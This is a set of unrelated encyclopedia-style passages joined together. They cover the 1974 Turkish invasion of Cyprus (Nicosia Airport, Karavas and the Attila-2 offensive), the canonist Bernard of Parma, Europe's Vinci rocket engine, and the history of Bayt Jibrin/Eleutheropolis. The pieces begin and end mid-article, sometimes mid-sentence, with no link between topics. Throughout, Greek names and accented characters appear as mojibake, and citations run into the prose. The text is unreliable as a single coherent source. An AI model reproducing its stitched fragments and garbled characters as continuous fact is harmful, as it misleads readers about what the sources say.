Cyprus 1974 by a Greek Commando, Published Istoria (History), 1993 The forces of A Commando arrived at Nicosia Airport just in time to mount a defence, via old city buses. They assumed fighting positions in and around the main terminal building, as a convoy of Turkish vehicles arrived at the north end of the airport, about 500 metres from the defenders. The main plan was to cooperate with the Greek Cypriot LOK in deploying a number of machine guns and anti-tank weapons (the Greeks had three 90mm EM69s), and allow the Turkish force to advance into the path of overlapping fire. However, the Turkish advance units spotted some of the enemy positions and commenced a general attack from the north. The initial wave of around a company of Turkish infantry attack was blunted by heavy weapons and small arms fire from the 42 LOK and 43 LOK to the south, while the 41 LOK opened fire from the terminal on the flank. Conceding defeat, the Turks fell back to their original positions with significant casualties. The latter then regrouped and advanced again in battalion strength towards the positions of the 42 and 43 LOKs, braving a withering hail of bullets. In turn, the Turks commenced fire from their rear-line with a mortar from the direction of an adjacent UN encampment. The Greek Cypriots now launched a counter-attack against the Turkish infantry within the airport perimeter by assaulting the ground troops with their five M8 Greyhound armoured vehicles. The Turkish forces based near the UN camp were targeted by the Greek 41 LOK, which fired M79 phosphorus grenades at them in order to cause a bush fire and smoke. A 90mm anti-tank rocket was also fired in the direction of a suspected observation post in a house on the northern edge of the airport, forcing it to be abandoned. Before the Canadian UN forces arrived, two Turkish M47 tanks attempted a diversionary attack to the eastern terminal. Defenders subsequently destroyed both with an M20 Super Bazooka. The 187MPP artillery battalion, located at Gerolakkos, received artillery attacks from Turkish forces at Arkadi, sustaining the loss of six personnel. Attila 1 aftermath After Attila 1, the Turkish forces controlled 7% of the island's area. They had successfully connected their beachhead in the north with the big Turkish Cypriot enclave north of Nicosia. They controlled the harbour of Kyrenia, which enabled them to increase the rate of reinforcements arriving from to Turkey, something essential for the second offensive. According to an announcement made by Turkish Prime Minister B√ºlent Ecevit on 25 July, the Turkish military had lost 57 killed, 184 wounded and 242 missing.ŒîŒπŒøŒΩœçœÉŒπŒøœÇ ŒöŒ±œÅŒ¥ŒπŒ±ŒΩœåœÇ, \\"Œü ŒëœÑœÑŒØŒªŒ±œÇ œÄŒªŒÆœÑœÑŒµŒπ œÑŒ∑ŒΩ ŒöœçœÄœÅŒøŒΩ\\", ŒïŒ∫Œ¥œåœÉŒµŒπœÇ ŒõŒ±Œ¥ŒπŒ¨œÇ, second edition, Athens 1976, page 137 Turkish-Cypriot losses are unknown. Between 20 and 22 July the Greek forces had suffered 215 killed and 223 missing, and an unknown number of wounded.Published casualty lists, as per the decision No.12/2000 of the Ministerial Council (Republic of Cyprus Government) of 4 May 2000 Clashes from 24 July to 13 August On 1 August 1974, elements of the Turkish 28th Division expelled the Greek Cypriot 316th infantry battalion from Hill 1024 (Kiparrisavouno) in the western Pentedaktylos mountains, and pushed them southwards into the Lapithou-Karavas corridor. During the night, B Company of 31MK Commando assaulted Hill 1024 and retook it from the Turks. At the village of Karavas, a Turkish M47 tank was hit and destroyed by a 3M6 Shmel anti-tank missile. On 2 August 1974, B Company of the 31MK Commando sustained an attack by Turkish commando forces, but repelled the assault. In the afternoon, a second major attack on the peak was mounted by larger elements of the 28th Division, forcing the Greek Cypriot commandos to give up Hill 1024 and retreat. The 316th infantry battalion, which was now south of Hill 1024 at Kornos Hill, mounted an ambush of a large force of the 28th Division, which was equipped with M47 tanks and M113 armoured personnel carriers. In the ambush, the 316th destroyed an M47 and M113, and captured an M47 and an M113. The latter two vehicles were given immediately to the 286MTP mechanised infantry battalion, which sent a recovery team to the area on the morning of 3 August.The Action of the Captured M47 in Attila II in The Unknown Soldier of Cyprus (Savvas Vlassis) On 3 August 1974, a main defensive line on the western front was established at Karavas to blockade the Karavas-Lapithos corridor from the Turkish 28th Division. This defensive line was manned by the 1st Company ELDYK, and the Greek Cypriot 316th, 321st and 256th infantry battalions, as well as a company of irregulars. On 6 August 1974, the Turkish 28th Division launched an offensive against the Karavas defensive lines of the Greek Cypriots and Greeks. This commenced at dawn, with heavy artillery and mortar fire supported by naval artillery (the latter firing at the 256th infantry battalion on the rear line). With combined artillery cover, tanks, and marine forces, the Turkish 28th Division extended west into Karavas, while a Turkish commando brigade and the Turkish 61st infantry regiment moved over the Pentedaktylos mountains to flank the Greek Cypriots from the north-east. The Turkish Air Force extensively bombed the areas of Laipthos-Karavas to Vavila-Vassilia during this offensive. At Kefalvoriso, just outside Lapithos, the 1st company ELDYK attacked elements of the Turkish 61st regiment, with the aid of mortars. In the afternoon, all Greek Cypriot forces in the area retreated to the Vasilia- Vavila defensive line. During the battle, two Turkish M47 tanks were engaged with recoilless rifles near Lapithos and destroyed. On 7 August, the Turkish 28th Division assaulted the Vasilia-Vavila defensive line with supportive artillery fire, but no infantry attack was made. Attila 2 Offensive Map depicting western battle lines of 14 August 1974 at the outset of the Attila-2 Offensive. On 14 August 1974, Turkish forces, reinforced to the strength of two infantry divisions and supporting elements, commenced a second major offensive, codenamed Attila-2. This offensive lasted three days and caused the defences of the Cypriot National Guard and ELDYK to collapse, leading to the capture of the towns of Famagusta, Morphou, and the northern quarter of Nicosia. The Greek Cypriots attempted to mount their main eastern defensive line between Mia Millia and Nea Chorio villages, northeast of Nicosia. Greek Forces The Greek forces were divided in three sectors: \\"Western\\", \\"Central\\" and \\"Eastern\\". The Greek plan was to delay the Turkish forces on the West and East, while retreating to the main defence line, and hold positions on the Centre. The main defence line, also called Troodos line, was the defence line where the Greek units would stand and fight. Until then, the Greek units were ordered to fight flexibly, retreating when needed. The Troodos line left about 40% of the island, including Famagusta, accessible to the Turkish forces. The western sector was defended by the 11th Tactical Group. Its left flank (north) was at the sea, near Vasileia, and its right (south) at the UN positions around the International Airport of Nicosia. The 11th TG consisted of the following battalions: 256th (centered around ELDYK's 1st company as it had suffered heavy casualties on 6 August at Lapithos- Karavas battle) at Vasileia, 316th (reinforced with part of the 366th reserve battalion) at Kornos, 281st (reinforced with one company of the 286th) at Kontemenos, 231st (with the rest of the 286th) at Skylloura, the 216th at Gerolakkos and the 33MK Commando at Hill 350, near Kalo Chorio, on the Agia Marina pass.Vlassis 2004 Nicosia International Airport was held by a Canadian force of the United Nations, directly adjacent to the battle lines of a large combined force of ELDYK reinforcements (A /35MK Commando) as well as a company of the 286th battalion, and a company of Greek Cypriot paramilitary police. The central sector spread from Nicosia International Airport and ended at the suburb on Nicosia of Mia Milia. It consisted of: the 212th reserve battalion, ELDYK's camp detachment (3 companies), the 336th reserve battalion (reinforced with various companies, and with a total strength of 1,300 men), the 211th battalion and the 187th artillery battalion. The eastern flank was the strongest sector, where the weight of the Turkish attack was expected to fall. It was defended by the DAT (Eastern Sector Command), which consisted of the 12th Tactical Group and the 9th Tactical Group. Further to the east were positioned the 1st High Tactical Command and the 15th Tactical Group. The 9th TG lay north, from the sea and including the Pentedaktylos mountains; and the 12th south of the mountains until and including Mia Milia village. From north to south the units were: The 9th TG: 361st battalion, 32 MK Commando and 346th battalion on reserve. The 12th TG: 251st battalion (reinforced with one reserve company), the 305th reserve battalion (aka \\"Markou's group\\" with 150 men), the 399th battalion, and the 241st battalion on reserve. Independent units included the 398th battalion facing the Turkish-Cypriot enclave of Tziaos, and the 226th battalion in general reserve. The total size of the Greek forces numbered at around twenty thousand men (18,000 Greek Cypriot - 2000 Greek), with 21 T-34 tanks, some tens of APCs and armoured cars and some 70 artillery pieces. Turkish Forces Turkish forces consisted mainly of the two infantry divisions (28th and 39th), one armoured regiment (one tank battalion and one mechanized infantry battalion from the 5th armoured brigade), the Turkish Regiment on Cyprus (reinforced with one parachute battalion, and one battalion from the 50th regiment), one Commando brigade and one Paratrooper brigade, plus additional elements of various units with an estimated total of 160‚Äì200 tanks, 200 APCs, 120 field guns and 40,000 men. Added to them were the remaining 5 Turkish-Cypriot regiments (with 19 battalions). The Turkish-Cypriot forces had lost 3 regiments (8 battalions) during Attila 1. The Turkish plan was divided in two phases: The first phase meant that the 39th Division and the armoured regiment would attack towards the Mesaoria plains in the east and unite with the Turkish-Cypriot enclave of Famagusta. The 28th Division would advance southward towards Tymbou airfield and contact the east of the Troodos line. The first phase was planned to last 2 days. The second phase would start at the evening of the second day. During this phase, the Commando brigade would advance from its positions at Agios Ermolaos to the south towards Morphou, and on the third day would unite with the Turkish-Cypriot enclave of Limnitis (but not with Kokkina (Erenk√∂y) enclave). During both phases, the Turkish forces would try to advance inside Nicosia and to the west of the city, towards Nicosia International Airport and the Nicosia-Morphou road. 14 August 1974 On the Eastern sector, the Turkish Navy, Airforce and artillery began firing at the Greek coalition positions at 6:30 am for about 30 minutes. The Greek counter-artillery fire was not enough to silence the Turkish fire. Turkish units of the 39th division attacked the Mia Milia defensive line of the Greek coalition forces. The line was held by the Greek-Cypriot 399th infantry battalion reinforced with two 3M6 Shmel missile launchers, 4 106mm recoilless rifles and 12 6-pounder gun anti- tank guns. The 399th battalion had used a small dried-out river bed as an anti-tank ditch, and laid anti-tank mines in front of the ditch. However, the UN were informed where the clear roads through the minefields were, and from many sources the Turkish 39th Division knew of them as well. The initial Turkish attacks with infantry against Koutsoventis and Mia Milia locations were repelled. They were swiftly followed by armoured attacks. The Turkish tanks circumnavigated the Greek minefields at Mia Milia. At 10:00 am they contacted the Greek Cypriot lines of 399th battalion and at 10:30 am they had broken through, cutting the 399th battalion in two. At 10:55 am the GEEF (High Command of the Cypriot National Guard) ordered the Eastern Sector Command to withdraw to Troodos line. The 241st battalion acting as the reserve of the 12th Tactical Group delayed the Turkish forces until 11:00 am, but lacking anti-tank weapons it started withdrawing immediately towards Famagusta. Following the collapse of the Greek Cypriot defensive line, the GEEF ordered the 226th battalion to mount a defensive line together with the 341st reserve battalion in order to delay the Turkish forces. The 226th battalion retreated at 21:00 to the south, while the 341st stayed put. The Turkish Air Force started hitting the retreating Greek forces and the Greek-Cypriot artillery battalions started retreating to the east as well. The 9th Tactical Group, even though it had been not attacked, faced the danger of encirclement from the south, and so started its retreat by 12:00. At 14:30 it had reached Famagusta. On the central sector, the ELDYK camp was hit by artillery fire and the Turkish Air Force. ELDYK forces were supported by Greek-Cypriot artillery fire, provide by the 187th artillery battalion equipped with Soviet 100mm guns. At 10:00 the camp was attacked by infantry, and at 11:00 by tanks, but the attacks were repelled. At 15:00 a new infantry attack was repelled. ELDYK lost 1 killed and 7 wounded in this engagement.www.ELDYK74.gr: ŒôŒ£Œ§ŒüŒ°ŒôŒöŒü Œ§ŒüŒ• Œ£Œ•ŒõŒõŒüŒìŒüŒ•, Greek journal, accessed: 02/08/2012 Turkish casualties were comparatively heavy, but allowed for the capture of the adjacent hilltop at Elissaios. In the western sector there was no major action. The hilltop Aspros, which had been used as an observation post, was abandoned by Greek- Cypriot forces after a Turkish attack. No effort for recapturing it was made. 15 August 1974 On the eastern sector, the retreating units of the Greek- Cypriot 12th Tactical Group crossed the defence line of the 341st battalion at 10:30. The 341st reserve battalion reinforced with three T-34 tanks and six 6-pounder guns was isolated and holding the defence line west of Famagusta on its own. The rest of the Greek forces continued their retreat to Larnaca and the Troodos main defence line. At 14:00 the Greek-Cypriot 341st noticed the Turkish tanks and the Turkish 14th infantry regiment approaching. Realizing it was abandoned and isolated, the command of the 341st ordered retreat at 17:00, covered by the T-34 tanks. The T-34 tanks (immobilized due to mechanical failures) and the six 6-pounder guns were left behind at their positions. The first Turkish units, including 4 M47 tanks and 11 M113 APCs, entered Famagusta at 17:30. They united with the Turkish-Cypriot units, but did not enter the undefended Greek-Cypriot district. The central sector saw a heavy exchange of fire, but no major engagements. In the western sector, the armoured units of the Turkish 28th Division made contact with the Greek units at about 14:30. The 28th Division's attack was augmented by the Turkish Commando Brigade's advance to the east. In total the Turkish units advanced up to 6 km to the west. On the night of 15 to 16 August, the Greek-Cypriot 11th Tactical Group (responsible for the western sector) was ordered to withdraw to the new Troodos defence line. 16 August 1974 In the eastern sector, Turkish forces consolidated their gains but made no major actions. Greek forces reorganized for defence on the Troodos line. In the central sector, the Turkish Air Force began pounding the Greek positions around the ELDYK camp at 8:30 am. Two Turkish formations, each one tank company and one infantry battalion strong, began approaching the camp under the cover of artillery fire. At noon both Turkish formations had reached 800m from the camp, where one stopped to provide support fire for the other as it assaulted the camp. Elements of the first Turkish formation started encircling the Greek camp from the east. At 13:00 Greek-Cypriot artillery stopped supporting the Greek forces inside ELDYK camp. The Greek forces, facing defeat were ordered to withdraw through the Turkish lines. At 13:30 the camp was in Turkish hands. Casualties were very heavy for both sides. ELDYK's official count was 80 killed, 22 wounded, 5 missing. The Turkish Army losses were less significant, with four M48 tanks knocked out by recoilless rifles and a fifth by a direct artillery hit The Turkish force continued southwards and pushed back the Greek-Cypriot 212th battalion. It stopped however after receiving Greek anti-tank fire. They also attacked the 336th battalion inside Nicosia, advancing some 100 metres, but with some 50 casualties. During this engagement a tank-on-tank battle occurred in the northern quarter of Nicosia, with three Greek Cypriot T-34 tanks in the hull-down position engaging and destroying a single M47 tank of the Turkish Army.Karkaletsis 2005 On the western sector, the entire Greek- Cypriot 11th Tactical Group had retreated to the Troodos line. Two platoons were left to keep contact with the advancing Turkish forces. The Turkish forces advanced slowly to the east. Morfou was captured at 12:30 and Limnitis at 18:00. By 18:00, when the UN instituted a cease-fire, the Turkish forces had not yet contacted the Troodos line. As a result, on 17 August both the Greek and the Turkish High Commands ordered units to advance even though the ceasefire had taken place. Several Greek-Cypriot units in the western sector suffered badly from desertions, as poorly disciplined reservists abandoned their units. The Troodos line was thus poorly manned. Attila 2 aftermath Immediately after the Attila-2 offensive ground to a halt, the two sides consolidated their positions and fortified their respective front lines with trenches, anti-tank ditches, minefields and lines of barbed wire. The Greek Cypriots made strong efforts to reinstate the units that had suffered severe desertions, and engaged in a major mobilization effort throughout 1975 to 1977. Deprived of military equipment through attrition and war usage, the Greek Cypriot forces relied heavily on re-supply by the Hellenic Navy to meet basic ammunition needs. On the other side, Turkish forces reinforced their new hold on northern Cyprus by building major bases, and converting an airfield at Lefkoniko into a functioning military air field with a modest runway. No further actions occurred after 18 August 1974.

He is generally called Bern(h)ardus Parmensis or Bernard of Parma, from his birthplace Parma. He studied in Bologna, under Tancred, where later he accepted the chair of canon law. Here Durantis was his disciple. According to the inscription on his tombstone he was Chancellor of the University of Bologna. Bernard obtained a canonry in the Cathedral of Bologna, and was also named chaplain to Pope Innocent IV and Pope Alexander IV, by whom he was employed in solving questions of weight. Works Decretals with Glossa ordinariaBernard found ample scope for his literary activity in his chosen branch, canon law. From glosses, summaries, and similar works, which had appeared on the Decretals of Gregory IX and other collections, he completed, just before his death, a work on the Gregorian Decretals. This, owing to his exact knowledge of former collections and thorough grasp of his subject, won for him the admiration of his contemporaries; so that he was styled \\"Glossator\\", and his work, commonly known as Glossa Ordinaria, became the fruitful source of later glosses, which were printed with Gregory's collection. Bernard was careful to note what he had taken from others, while his own comments were signed \\"Bern.\\" Another work, entitled \\"Summa super Titulis Decretalium\\", was based on similar writings of his master, Tancred, of Bernard of Pavia and others. It is a clear, concise treatise, found in the works of Nicolaus de Tudeschis (Milan, five volumes in folio). Editions Glossa ordinaria in decretalesThe Glossa Ordinaria was given to the press in Mainz in 1472, 1473, and in Rome in 1474.

It is designed to power the new upper stage of Ariane 6. Overview Vinci is an expander cycle rocket engine fed with liquid hydrogen and liquid oxygen. Its biggest improvement from its predecessor, the HM7B (which powers the ESC-A), is the capability of restarting up to five times. It is also the first European expander cycle engine, removing the need for a gas generator to drive the fuel and oxidizer pumps. The engine features a carbon ceramic extendable nozzle in order to have a large, 2.15 m diameter nozzle extension with minimum length: the retracted nozzle part is deployed only after the upper stage separates from the rest of the rocket; after extension, the engine's overall length increases from 2.3 m to 4.2 m. Development Although the ESC-B development was put on hold in 2003, the Vinci project has not been cancelled: at a lower pace, the engine is still being developed. On 22 December 2006, Snecma announced a new ESA contract for Vinci rocket engine long-duration and re-ignition testing. In late April 2010 the German Aerospace Center DLR announced the start of a six-month test campaign for the Vinci engine at its Lampoldshausen facility. The first successful test firing of this campaign took place on 27 May 2010. A video of a test was released in 2016. In 2014, NASA was interested with the idea of using the Vinci instead of the RL10 for an upper stage of Space Launch System. The Vinci offers the same specific impulse at the same mass but with 64% greater thrust, which would allow for a reduction of one or two of the four second stage engines for the same performance, while the cost would be lower. , the first flight of the Ariane 6 rocket with Vinci is planned for 2020. In July 2017, Ariane Group reported that the first flight models of the combustion chamber had entered production.

Quoted in Hadawi, 1970, p. 143 During the 8th century BCE, the village was part of the Kingdom of Judah. During the days of Jewish king Herod the town was the administrative center for the district of Idumea. After the turmoil of the First Jewish-Roman War and the Bar Kokhba revolt the town became a thriving Roman colony and a major administrative center under the name of Eleutheropolis. In the early 7th century CE, Bayt Jibrin was conquered by Muslim forces led by 'Amr ibn al-'As. Under the Crusaders in the 12th century, it was known as Beth Gibelin, and had a population of 1,500, compared to 100‚Äì150 in the average village of the time.The Fall of the Latin Kingdom of Jerusalem, Joshua Prawer, Israel Argosy, p.186, Jerusalem Post Press, Jerusalem, 1956 It fell to the Mamluks and then the Ottoman Turks. In the 19th century, the al-'Azza family took control of Bayt Jibrin and unsuccessfully attempted to rebel against the Ottomans, ending in the exile and execution of local leaders. Under the British Mandate of Palestine, Bayt Jibrin again served as a district center for surrounding villages. It was captured by Israeli forces during the 1948 War, causing its inhabitants to flee eastward. Today, many of the refugees of Bayt Jibrin and their descendants live in the Bayt Jibrin and Fawwar camps in the southern West Bank.

History Iron Age Maresha The excavations have revealed no remains older than the Iron Age, a time when the Judahite town of Maresha rose on the tell known in Arabic as Tell Sandahanna and in Hebrew as Tel Maresha.Avraham Negev and Shimon Gibson (editors), Archaeological Encyclopedia of the Holy Land, Continuum 2001, p 315. This corresponds to several Hebrew Bible mentions of Maresha. However, local folklore tells that the former Arab village of Bayt Jibrin was first inhabited by Canaanites.Nashashibi, 1997, Bayt Jibrin Before 1948 Center for Research and Documentation of Palestinian Society, Birzeit University. After the destruction of the Kingdom of Judah in 586 BCE, the city of Maresha became part of the Edomite kingdom. In the late Persian period a Sidonian community settled in Maresha, and the city is mentioned in the Zenon Papyri (259 BCE). During the Maccabean Revolt, Maresha was a base for attacks against Judea and suffered retaliation from the Maccabees. In 112 BCE, Maresha was conquered and destroyed by the Hasmonean king, John Hyrcanus I, after which the region of Idumea (the Greek name of Edom) remained under Hasmonean control and Idumeans were forced to convert to Judaism. In 40 BCE, the Parthians devastated completely the \\"strong city\\", after which it was never rebuilt. After this date, nearby Beit Guvrin succeeded Maresha as the chief center of the area. Roman and Byzantine periods In the Jewish War (68 CE), Vespasian slaughtered or enslaved the inhabitants of Betaris. According to Josephus: \\"When he had seized upon two villages, which were in the very midst of Idumea, Betaris, and Caphartobas, he slew above ten thousand of the people, and carried into captivity above a thousand, and drove away the rest of the multitude, and placed no small part of his own forces in them, who overran and laid waste the whole mountainous country.\\"Josephus, De Bell.

Old Roman Road, leading from Jerusalem to Beit Gubrin, adjacent to regional hwy 375 in Israel Septimius Severus, Roman Emperor from 193 to 211, granted the city municipal status, renaming it Eleutheropolis meaning \\"City of the Free\\" and exempting its citizens from taxes.Sharon, 1999, p. 111 Coins minted by him, bearing the date 1 January 200, commemorate its founding.Catholic Encyclopedia, s.v. \\"Eleutheropolis\\" . Eleutheropolis, which covered an area of (larger at the time than Aelia Capitolina - the Roman city built over the ruins of Jewish Jerusalem), flourished under the Romans, who built public buildings, military installations, aqueducts and a large amphitheater. Towards the end of the 2nd century CE, Rabbi Judah the Prince ameliorated the condition of its Jewish citizens by releasing the city from the obligations of tithing home-grown produce, and from observing the Seventh Year laws with respect to the same produce, as believing this area of the country was not originally settled by Jews returning from the Babylonian captivity.Jerusalem Talmud, Demai 2:1. Since the region of Beit Jibrin (Eleutheropolis) was typically seen as not settled by Jews returning from the Babylonian captivity, it therefore had not the same consecrated status as other areas of the country, making its Jewish citizens exempt from tithing home-grown produce. The vita of Epiphanius of Salamis, born into a Christian family near Eleutheropolis, describes the general surroundings in Late Antique Judaea.The Panarion of Epiphanius of Salamis: Book I (Sects 1-46) By Epiphanius, Epiphanius of Salamis, Translated by Frank Williams BRILL, (1987) p xi The second chapter of the vita describes the details of the important market of Eleutheropolis.Safrai, Zeev (1994) The Economy of Roman Palestine Routledge, p 257 Seven routes met at Eleutheropolis,Amos Kloner, 1999. \\"The City of Eleutheropolis\\" in The Madaba Map Centenary 1897-1997, (Jerusalem) pp 244-246. and Eusebius, in his Onomasticon, uses the Roman milestones indicating the city as a central point from which the distances of other towns were measured. The Madaba Map (dated 542-570 CE) shows Eleutheropolis as a walled city with three towers, a curving street with a colonnade in the central part and an important basilica. In the centre is a building with a yellowish-white dome on four columns. Madaba Map Online Eleutheropolis was last mentioned in the ancient sources by the near contemporary itinerarium of the Piacenza Pilgrim,Anonymus Placentinus Itinerarium 32 about 570. In the 1st and 2nd centuries CE, Christianity penetrated the city due to its location on the route between Jerusalem and Gaza. The city's first bishop, Justus, was one of the 70 Disciples. In 325 CE, Eleutheropolis was the seat of Bishop Macrinus, who in that year attended the First Council of Nicaea. Epiphanius of Salamis, Bishop of Salamis in Cyprus, was born at Eleutheropolis; at Ad nearby he established a monastery which is often mentioned in the polemics of Jerome with Rufinus and John, Bishop of Jerusalem. Beit Guvrin is mentioned in the Talmud in the 3rd and 4th centuries, indicating a revival of the Jewish community around that time. The tanna Judah b. Jacob and the amora Jonathan (referred to in the Talmud as \\"Yonatan me-Bet Guvrin\\" or Jonathan of Bet Guvrin) were residents of the city. The Talmudic region known as Darom was within the area of Eleutheropolis (\\"Beit Guvrin\\"),\\"Encyclopedia Judaica\\", Bet Guvrin, p.731, Keter Publishing, Jerusalem, 1978 later known by its Arabic corruption ad-DƒÅr≈´m.Al-Muqaddasi, Description of Syria, Including Palestine, ed. Guy Le Strange, London 1886, p. 53 Excavations at Eleutheropolis show a prosperous city, and confirm the presence of Jews and Christians in the area. It was described as one of Palestine's five \\"Cities of Excellence\\" by 4th- century Roman historian Ammianus Marcellinus.The City of Eleutheropolis Kloner, Amos. Studium Biblicum Franciscanum - Jerusalem. 2000-12-16. The territory under the administration of Eleutheropolis encompassed most of Idumea, with the districts of Bethletepha, western Edom and Hebron up to Ein Gedi, and included over 100 villages. Early Islamic period Early Muslim historian al-Biladhuri mentions Bayt Jibrin (the name given to it by the Arabs following the Muslim conquest) as one of ten towns in Jund Filastin (military district of Palestine) conquered by the Muslim Rashidun army under 'Amr ibn al-'As's leadership during the 630s. Al-Biladhuri also wrote that al-'As enclosed a domain to Bayt Jibrin, which he named 'Ajlan, after one of his freemen.The conquered towns included \\"Ghazzah (Gaza), Sabastiyah (Samaria), Nabulus (Shechem), Kaisariyyah (C√¶sarea), Ludd (Lydda), Yubna, Amwas (Emmaus), Yafa (Joppa), Rafah, and Bait Jibrin\\". (Bil. 138), quoted in Le Strange, 1890, p.28 The 1904 Analecta Bollandiana recounts that in 638 the Muslim army beheaded fifty soldiers in Bayt Jibrin from the Byzantine garrison of Gaza who refused to abandon Christianity and who were then buried in a church built in their honor.Analecta Bollandiana 1904, pp. 289f, cited in Sim√©on Vailh√©, \\"Eleutheropolis\\" in Catholic Encyclopedia (New York 1909) In the beginning of the power struggle between Ali and Mu'awiya for the position of caliph, al-'As left Medina in the Hejaz and resided in Bayt Jibrin with his two sons Muhammad and Abdullah. The latter died there.Sharon, 1999, p. 115. Quoting al- Biladhuri, al-Waqidi and Yaqut al-Hamawi. The city may have been devastated in 788, but in 796, Bayt Jibrin was destroyed by Bedouin tribesmen in an effort to combat Christian influence in the region during a civil war between the Arab tribal federations of the area. According to a monk named Stephen, \\"it was laid waste, and its inhabitants carried off into captivity\\". However, by 985, the city, by then under Abbasid rule, seemed to have recovered, judging by the writings of the Muslim geographer al-Muqaddasi: > \\"[Bayt Jibrin] is a city partly in the hill country, partly in the plain. > Its territory has the name of Ad Darum (the ancient Daroma and the modern > Dairan), and there are here marble quarries. The district sends its produce > to the capital (Ar Ramlah). It is an emporium for the neighbouring country, > and a land of riches and plenty, possessing fine domains. The population, > however, is now on the decrease....\\"Muk., 174, quoted in Le Strange, 1890, > p.412 Al-Muqaddasi, 1994, p. 157 Today, there is no marble quarry anywhere in Palestine, but al-Muqaddasi probably referred to the underground chalkstone quarries known today as \\"bell caves\\". Crusader and Mamluk eras Remains of the Crusader church in Bayt Jibrin, 2009 In 1099, Crusaders invaded Palestine and established the Kingdom of Jerusalem. In 1135, King Fulk of Jerusalem erected a castle on the lands of Bayt Jibrin, the first of a series of Crusader fortifications built at this time to ensure control over the ports of Caesarea and Jaffa. In 1136, King Fulk donated the castle to the Knights Hospitallers. In 1168, the Hospitallers were granted a charter to establish a Frankish colony, which they named \\"Bethgibelin\\".Jean Richard Crusaders c. 1071-c, 1291 p 96 Christian settlers in Beit Jibrin were promised a share of property looted from the Muslims. It was on the itinerary of Benjamin of Tudela, who found three Jews living there when he visited the country.Robinson, Edward & Smith, Eli (1856) J. Murray. p 29 The Ayyubid army under Saladin sacked Bethgibelin in 1187, after most of the Kingdom of Jerusalem came under Muslim control as a consequence of his victory at the Battle of Hittin. Soon after its capture Saladin ordered the demolition of the Crusader castle. From 1191 to 1192, the town was held in probate by Henry of Champagne, as lord of the Kingdom of Jerusalem, while Saladin and Richard the Lionheart negotiated a ceasefire.Jean Richard (1921) \\"The Crusaders c1071-c1291\\" reprinted 2001 Cambridge University Press p. 230 However, the Crusaders remained in control of Bethgibelin until 1244, when the Ayyubids reconquered it under Sultan as-Salih Ayyub. By 1283, the Mamluks had taken control and it was listed as a domain of Sultan Qalawun.Sharon, 1999, p. 122 The city prospered under the Egypt-based Mamluk Sultanate and served as a postal station.

Bayt Jibrin and all of Palestine was conquered by the Ottomans after their victory over the Mamluks during the 1516 Battle of Marj Dabiq. Bayt Jibrin subsequently became part of the nahiya (subdistrict) of Hebron (al-Khalƒ´l), which was part of the sanjak (\\"district\\") of Gaza. The Ottomans did not exercise strict control over their territories and tended to keep local leaders in their traditional positions as long as they complied with the higher authorities and paid imperial taxes.Khalidi, 1992, p.209 During Suleiman the Magnificent's reign, in 1552, the destroyed Crusader castle in Bayt Jibrin was partially rebuilt in order to protect the main road between Gaza and Jerusalem. In 1596, the inhabitants of Bayt Jibrin, consisting of 50 Muslim families, paid taxes on wheat, barley and sesame seeds, as well as goats and beehives.H√ºtteroth and Abdulfattah, 1977, p. 149 In the 19th century, Bayt Jibrin was the seat of the 'Azza family, who had ruled the area since migrating to Palestine from Egypt.Darwaza, Muhammad ¬¥Izzat. Al -¬¥arab wa-l-¬¥uruba min al-qarn al-thalit hatta al-qarn al-rabi¬¥ ¬¥ashar al-hijri, vol 2 (Damascus, 1960), pp 138-140, quoted in Sch√∂lch, 1993, p.189. In the 1840s, after the Ottomans attempted to crush local leaders in the Hebron Hills for their refusal to pay taxes, the 'Azza family joined a revolt against Ottoman rule. They had aligned themselves to the 'Amr clan of the Hebron-area village of Dura. Between 1840‚Äì46, hostilities were raging between the Qays and Yaman tribo-political factions in southern Palestine. The 'Azza and 'Amr families, part of the Qays confederation, were constantly clashing with the Yaman- aligned Abu Ghosh clan, who were based in the vicinity of Jerusalem. In 1846, the shaykh (chief) of Bayt Jibrin, Muslih al-'Azza (known as the \\"giant of Bayt Jibrin\\"), the leader of the 'Amr clan, and other local leaders were exiled, but were allowed to return in the early 1850s.Sch√∂lch, 1993, p. 234-235. Note 708 states that there is more information about them in Finn, Byeways in Palestine , pp. 176-183 (in 1849 an elderly fellah from the district asked Finn to inform the sultan in Constantinople of the cruel harassment of the peasants by Muslih al-¬¥Azza and his family.) W.M. Thomson In 1855, the newly appointed Ottoman pasha (\\"governor\\") of the sanjak (\\"district\\") of Jerusalem, Kamil Pasha, attempted to subdue the rebellion in the Hebron region. Kamil Pasha marched towards Hebron with his army in July 1855, and after crushing the opposition, he ordered the local shaykhs to summon to his camp.Sch√∂lch, 1993, p. 236-237. Several of the shaykhs, including the leader of the 'Amr clan and Muslih al-'Azza, did not obey the summons. Kamil Pasha then requested that the British consul in Jerusalem, James Finn, serve as an envoy and arrange a meeting with Muslih. Finn sent his vice-consul to assure Muslih of his safety in Hebron and convinced him to meet with Kamil Pasha. Muslih was well received in Hebron and returned to Bayt Jibrin escorted by twenty of the governor's men. Soon after, the Kamil Pasha paid a visit to Bayt Jibrin to settle affairs and collect the town's overdue taxes.Finn, 1878, Vol II, p. 305-308 Kamil Pasha took an oath of loyalty from all the local shaykhs in the Hebron region, including those under the rule of Muslih al-'Azza. In 1838, American archeologist Edward Robinson was able to locate the site of Bethgebrim.Robinson and Smith, 1841, vol. 2, p. 360 He cited William of Tyre's reference to the Arabic name.\\"Urbem veterem et dirutam ... Arabice Bethgebrim; \\" ibid. n. 4. Later travelers who visited Bayt Jibrin during that time were very impressed both by the shaykh of Bayt Jibrin, as well as by his \\"castle\\" or \\"manor\\". At the time, the remains of the Crusader fortress still served for defensive purposes in the village.Van de Velde, 1854, vol. 2, p. 157; Conder and Kitchener, 1883, SWP III, p. 257, p. 266; Gu√©rin, 1869, p. 331. All quoted in Sch√∂lch, 1993, p. 189. According to Bayt Jibrin's shaykh, in 1863, he was in command of 16 villages in the area and pledged \\"to provide as many as 2,000 men to the government if necessary.\\"Furrer, Konrad: Wanderungen durch das Heilige Land, Zurich, 1891, pp 118-25. Quoted in Sch√∂lch, 1993, p. 189. In 1864, however, Muslih's brother told a traveler that Muslih and his property had been seized on \\"false charges of treason,\\" and that he had been banished to Cyprus and then beheaded.Trisdam, 1865, p. 378 Socin found from an official Ottoman village list from about 1870 that Bayt Jibrin had a population of 508, with a total of 147 houses, though the population count included men, only.Socin, 1879, p. 146Hartmann, 1883, p. 143 noted 148 houses Bayt Jibrin's status began to decline throughout the 19th century. According to Western travelers it was \\"a small and insignificant village\\". The primary factors that contributed to the decline were the Bedouin raids on Bayt Jibrin's countryside villages, the 'Azza revolt, tribal warfare among the inhabitants of the towns and villages throughout Palestine and epidemics which struck the town and the nearby 